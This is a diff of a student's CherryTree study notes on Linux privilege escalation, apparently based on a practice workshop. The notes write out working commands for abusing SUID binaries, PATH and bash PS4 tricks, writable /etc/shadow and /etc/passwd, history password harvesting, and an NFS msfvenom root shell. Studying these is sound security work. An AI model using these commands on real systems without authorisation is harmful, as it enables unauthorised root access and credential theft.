@@ -7591,7 +7591,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt
 Find the flag
 flag2 in \Windows\system32\config</rich_text>
       </node>
-      <node name="Common linux privesc" unique_id="247" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1706904870" ts_lastsave="1707456371">
+      <node name="Common linux privesc" unique_id="247" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1706904870" ts_lastsave="1707539739">
         <rich_text>Understanding privesc
 - going from a lower permission to a higher permission
 - exploitation of vulnerabilities
@@ -7617,7 +7617,33 @@ Enumeration
    → kernel, information, exploitable available for this machine
    → we read/write sensitive files, files that any auth user can read and write to
    → SUID files, interesting items to escalate privileges. SUID is a special type of file permission give to a file
-   → Crontab contents: cron are show here
+   → Crontab contents: cron are show here</rich_text>
+      </node>
+      <node name="Linux PrivEsc" unique_id="248" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="27" is_bold="0" foreground="" ts_creation="1707255940" ts_lastsave="1707539744">
+        <rich_text>Multiple types of Privileges Escalation
+based in: </rich_text>
+        <rich_text link="webs https://github.com/sagishahar/lpeworkshop">https://github.com/sagishahar/lpeworkshop</rich_text>
+        <rich_text>
+connect with -oHostKeyAlgorithms=+ssh-rsa
+
+Service exploits
+- use of mysql to export, running like root
+- use of UDF (user defined functions), </rich_text>
+        <rich_text link="webs https://www.exploit-db.com/exploits/1518">https://www.exploit-db.com/exploits/1518</rich_text>
+        <rich_text>
+
+Weak File Permissions - readable /etc/shadow
+- contains user password hashes, only readable by root
+- check permissions of /etc/shadow, and show content
+
+Writable file permissions, /etc/shadow
+- create password: mkpasswd -m sha-512 {pass}
+
+Writable file permissions /etc/passwd
+- information about user accounts
+- readable by all world
+- contains user passwords and some versions this saved here
+- password hash: openssl passwd {password}
 
 Abusing SUID/GUID files
 - first step, check files with the SUID/GUID bit set.
@@ -7664,32 +7690,37 @@ Cron jobs, file permissions
 - is located in /etc/crontab
 - </rich_text>
         <rich_text link="webs https://gtfobins.github.io/gtfobins/tar/">https://gtfobins.github.io/gtfobins/tar/</rich_text>
-      </node>
-      <node name="Linux PrivEsc" unique_id="248" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="27" is_bold="0" foreground="" ts_creation="1707255940" ts_lastsave="1707269298">
-        <rich_text>Multiple types of Privileges Escalation
-based in: </rich_text>
-        <rich_text link="webs https://github.com/sagishahar/lpeworkshop">https://github.com/sagishahar/lpeworkshop</rich_text>
-        <rich_text>
-connect with -oHostKeyAlgorithms=+ssh-rsa
-
-Service exploits
-- use of mysql to export, running like root
-- use of UDF (user defined functions), </rich_text>
-        <rich_text link="webs https://www.exploit-db.com/exploits/1518">https://www.exploit-db.com/exploits/1518</rich_text>
         <rich_text>
 
-Weak File Permissions - readable /etc/shadow
-- contains user password hashes, only readable by root
-- check permissions of /etc/shadow, and show content
+SUID / GUID executables
+- find all SUID/GUID executables: find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null
+- using SUID executable to shared object injection
+- use of strace on the file and search output for open/access for no such file errors: strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE “open|access|no such file”
+- using PATH environment variable and attempting to execute programs
+- use of string to show all printable chars, get service to execute, for example “service apache2 start” and use of the path: PATH=.:$PATH /usr/local/bin/suid-env
+- abusing shell features, in bash &lt;4.2-048 it is possible define shell functions with names that resemble file paths, create function in bash using : function {name} [code] and export -f {function name}
+- in debug mode bash (&lt;4.4) use VarEnv PS4 to display an extra prompt, env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' {bash file}
 
-Writable file permissions, /etc/shadow
-- create password: mkpasswd -m sha-512 {pass}
+Password and keys
+- possible get password if is typed by issue in command line
+- view content of history: cat ~/.*history | less
+- config files contain passwords in plaintext
+- backups with important files, show hidden files: ls -la
 
-Writable file permissions /etc/passwd
-- information about user accounts
-- readable by all world
-- contains user passwords and some versions this saved here
-- password hash: openssl passwd {password}</rich_text>
+NFS
+- files creates with NFS inherit the remote user's ID
+- cat /etc/exports
+- connect to root user in local machine
+- create tmp file: mkdir /tmp/nfs
+- mount to machine: mount -o rw,vers=3 {ip}:/tmp /tmp/nfs
+- msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+- chmod +xs /tmp/nfs/shell.elf
+- /tmp/shell.elf
+
+Kernel exploits
+- leave unstable state
+- exploit suggester 2: perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
+- the most common uis dirty cow</rich_text>
       </node>
     </node>
     <node name="Pyramid of pain" unique_id="150" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939081" ts_lastsave="1685940575">
